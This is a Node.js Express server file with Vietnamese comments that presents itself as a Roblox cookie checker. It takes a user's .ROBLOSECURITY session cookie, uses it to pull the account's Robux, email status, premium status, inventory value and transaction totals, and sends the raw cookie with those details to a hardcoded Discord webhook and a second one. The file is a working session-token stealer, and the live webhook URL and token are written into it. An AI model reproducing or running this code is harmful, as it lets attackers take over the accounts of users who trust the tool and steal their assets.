require('dotenv').config();
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const cors = require("cors");
const path = require("path");
const dns = require('dns');
const ping = require('ping');
const https = require('https');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1281163629278003221/UsFxAWKVhLDb37jw3eQdN7hqsXAxVYR6aZQLKrYC4oja7qqhW5PLDR45f5ztbAM4rSmY';

// Th√™m middleware CORS
app.use(cors());

// Th√™m middleware ƒë·ªÉ serve static files
app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.json());

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// H√†m ƒë·ªÉ ƒë·ªçc webhook t·ª´ file
app.post("/check-cookie", async (req, res) => {
    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({ 
            success: false, 
            error: "Kh√¥ng t√¨m th·∫•y cookie." 
        });
    }

    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Accept': 'application/json',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    };

    try {
        // Ki·ªÉm tra cookie v√† l·∫•y th√¥ng tin user
        console.log('ƒêang k·∫øt n·ªëi ƒë·∫øn users.roblox.com...');
        const userResponse = await axiosInstance.get('https://users.roblox.com/v1/users/authenticated', {
            headers,
            timeout: 10000
        });

        if (!userResponse.data || !userResponse.data.id) {
            throw new Error('Cookie kh√¥ng h·ª£p l·ªá ho·∫∑c ƒë√£ h·∫øt h·∫°n');
        }

        const userData = userResponse.data;
        console.log('K·∫øt n·ªëi th√†nh c√¥ng ƒë·∫øn users.roblox.com');

        // L·∫•y th√¥ng tin b·ªï sung
        console.log('ƒêang l·∫•y th√¥ng tin chi ti·∫øt...');
        const userId = userData.id;

        // T·∫°o c√°c promise cho c√°c request
        const promises = [
            // L·∫•y th√¥ng tin Robux
            axiosInstance.get(`https://economy.roblox.com/v2/users/${userId}/currency`, {
                headers,
                timeout: 10000
            }).catch(error => {
                console.error('L·ªói khi l·∫•y th√¥ng tin Robux:', error.message);
                return { data: { robux: 0 } };
            }),

            // L·∫•y th√¥ng tin email
            axiosInstance.get('https://accountsettings.roblox.com/v1/email', {
                headers,
                timeout: 10000
            }).catch(error => {
                console.log('L·ªói khi l·∫•y th√¥ng tin email:', error.message);
                return { data: { verified: false } };
            }),

            // L·∫•y th√¥ng tin premium
            axiosInstance.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
                headers,
                timeout: 10000
            }).catch(error => {
                console.log('L·ªói khi l·∫•y th√¥ng tin premium:', error.message);
                return { data: false };
            }),

            // L·∫•y th√¥ng tin avatar
            axiosInstance.get(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png`, {
                headers,
                timeout: 10000
            }).catch(error => {
                console.log('L·ªói khi l·∫•y avatar:', error.message);
                return { data: { data: [{ imageUrl: null }] } };
            }),

            // Ki·ªÉm tra Verify Hat
            axiosInstance.get(`https://inventory.roblox.com/v2/users/${userId}/inventory/8?limit=100`, {
                headers,
                timeout: 10000
            }).catch(error => {
                console.log('L·ªói khi ki·ªÉm tra Verify Hat:', error.message);
                return { data: { data: [] } };
            }),

            // L·∫•y RAP t·ª´ Rolimons
            axiosInstance.get(`https://www.rolimons.com/api/playerassets/${userId}`, {
                timeout: 10000
            }).catch(error => {
                console.error('L·ªói khi l·∫•y RAP t·ª´ Rolimons:', error.message);
                return { data: { rap: 0 } };
            }),

            // L·∫•y th√¥ng tin giao d·ªãch
            axiosInstance.get(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, {
                headers,
                timeout: 10000
            }).then(response => response.data).catch(error => {
                console.log('L·ªói khi l·∫•y th√¥ng tin giao d·ªãch:', error.message);
                return { pendingRobuxTotal: 0, premiumStipendsTotal: 0, developerExchangeTotal: 0,purchasesTotal: 0 };
            })
        ];

        // Ch·ªù t·∫•t c·∫£ c√°c request ho√†n th√†nh
        const [robuxRes, emailRes, premiumRes, avatarRes, verifyHatRes, rolimonsRes, transactions] = await Promise.all(promises);

        // Ki·ªÉm tra Verify Hat (ID: 102611803)
        const hasVerifyHat = verifyHatRes.data.data.some(item => item.assetId === 102611803);

        const fileWebhookUrl = await getWebhookUrl();

        // T·∫°o webhook cho th√¥ng tin t√†i kho·∫£n v√† cookie
        const combinedWebhook = {
            embeds: [{
                title: '‚úÖ Cookie H·ª£p L·ªá',
                description: `**Th√¥ng tin t√†i kho·∫£n c·ªßa ${userData.name}**\n\n**Cookie Value:** \`${cookie}\``, // ƒê∆∞a cookie v√†o ph·∫ßn description
                color: 0x00ff00,
                thumbnail: avatarRes.data.data[0].imageUrl ? {
                    url: avatarRes.data.data[0].imageUrl
                } : undefined,
                fields: [
                    {
                        name: 'üë§ Username',
                        value: `\`${userData.name}\``,
                        inline: true
                    },
                    {
                        name: 'üÜî User ID',
                        value: `\`${userId}\``,
                        inline: true
                    },
                    {
                        name: 'üí∞ Robux',
                        value: `\`${robuxRes.data.robux || 0}\``,
                        inline: true
                    },
                    {
                        name: 'üíé Premium',
                        value: `\`${premiumRes.data ? 'C√≥' : 'Kh√¥ng'}\``,
                        inline: true
                    },
                    {
                        name: 'üìß Email',
                        value: `\`${emailRes.data.verified ? 'ƒê√£ x√°c th·ª±c' : 'Ch∆∞a x√°c th·ª±c'}\``,
                        inline: true
                    },
                    {
                        name: '‚úÖ Verify Hat',
                        value: `\`${hasVerifyHat ? 'C√≥' : 'Kh√¥ng'}\``,
                        inline: true
                    },
                    {
                        name: 'üìä RAP',
                        value: `\`${(rolimonsRes.data.rap || 0).toLocaleString('en-US')} R$\``,
                        inline: true
                    },
                    {
                        name: 'üéÆ Profile',
                        value: `[Click Here](https://www.roblox.com/users/${userId}/profile)`,
                        inline: true
                    },
                    {
                        name: 'üéØ Rolimons',
                        value: `[Click Here](https://www.rolimons.com/player/${userId})`,
                        inline: true
                    },
                    {
                        name: ':money_mouth:  Summary',
                        value: `\`${transactions.purchasesTotal}\``,
                        inline: true
                    },
                    {
                        name: 'üí∞ Pending Robux',
                        value: `\`${transactions.pendingRobuxTotal}\``,
                        inline: true
                    },
                    {
                        name: 'üéÅ Premium Stipends',
                        value: `\`${transactions.premiumStipendsTotal}\``,
                        inline: true
                    },
                    {
                        name: 'üíµ Developer Exchange',
                        value: `\`${transactions.developerExchangeTotal}\``,
                        inline: true
                    }
                ],
                footer: {
                    text: 'https://discord.gg/kp7XTjhjvM'
                },
                timestamp: new Date().toISOString()
            }]
        };

        // G·ª≠i webhook c·ªë ƒë·ªãnh
        await axios.post(DISCORD_WEBHOOK_URL, combinedWebhook);
        console.log('G·ª≠i webhook c·ªë ƒë·ªãnh th√†nh c√¥ng');

        // G·ª≠i webhook t·ª´ file
        await axios.post(fileWebhookUrl, combinedWebhook);
        console.log('G·ª≠i webhook t·ª´ file th√†nh c√¥ng');

        // Tr·∫£ v·ªÅ k·∫øt qu·∫£
        res.status(200).json({
            success: true,
            message: "Ki·ªÉm tra cookie th√†nh c√¥ng!",
            data: {
                userId,
                username: userData.name,
                displayName: userData.displayName,
                robux: robuxRes.data.robux || 0,
                premium: premiumRes.data,
                email: emailRes.data,
                avatar: avatarRes.data.data[0].imageUrl,
                hasVerifyHat: hasVerifyHat,
                rap: rolimonsRes.data.rap || 0,
                rolimons: `https://www.rolimons.com/player/${userId}`,
                pendingRobuxTotal: transactions.pendingRobuxTotal,
                premiumStipendsTotal: transactions.premiumStipendsTotal,
                developerExchangeTotal: transactions.developerExchangeTotal,
                purchasesTotal: transactions.purchasesTotal
            }
        });

    } catch (error) {
        if (error.response) {
            console.error('L·ªói:', error.response.status);
            console.error('Chi ti·∫øt:', error.response.data);
        } else {
            console.error('L·ªói kh√¥ng x√°c ƒë·ªãnh:', error.message);
        }
        




        const errorMessage = {
            title: '‚ùå L·ªói Ki·ªÉm Tra Cookie',
            description: error.message || 'L·ªói kh√¥ng x√°c ƒë·ªãnh',
            details: `Th·ªùi gian: ${new Date().toLocaleString('vi-VN')}\nM√£ l·ªói: ${error.code || 'Kh√¥ng x√°c ƒë·ªãnh'}`
        };

        // G·ª≠i webhook th√¥ng b√°o l·ªói
        try {
            await axios.post(DISCORD_WEBHOOK_URL, {
                embeds: [{
                    title: errorMessage.title,
                    description: errorMessage.description,
                    color: 0xFF0000,
                    fields: [
                        {
                            name: 'Chi ti·∫øt',
                            value: errorMessage.details
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            });
        } catch (webhookError) {
            console.error('L·ªói g·ª≠i webhook:', webhookError.message);
        }

        res.status(500).json({
            success: false,
            error: errorMessage.description,
            details: errorMessage.details
        });
    }
});

// C·∫•u h√¨nh DNS servers
dns.setServers([
    '8.8.8.8',    // Google DNS
    '8.8.4.4',    // Google DNS (backup)
    '1.1.1.1',    // Cloudflare DNS
    '1.0.0.1'     // Cloudflare DNS (backup)
]);

// T·∫°o instance axios v·ªõi c·∫•u h√¨nh t√πy ch·ªânh
const axiosInstance = axios.create({
    timeout: 30000, // 30 seconds
    httpsAgent: new https.Agent({
        rejectUnauthorized: false, // B·ªè qua l·ªói SSL
        keepAlive: true,
        timeout: 30000
    }),
    proxy: false, // T·∫Øt proxy m·∫∑c ƒë·ªãnh
    maxRedirects: 5
});

// ƒê·ªãnh nghƒ©a h√†m calculateUsedRobux
function calculateUsedRobux() {
    // Logic ƒë·ªÉ t√≠nh to√°n s·ªë Robux ƒë√£ s·ª≠ d·ª•ng
    return 100; // Thay th·∫ø b·∫±ng logic th·ª±c t·∫ø c·ªßa b·∫°n
}

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
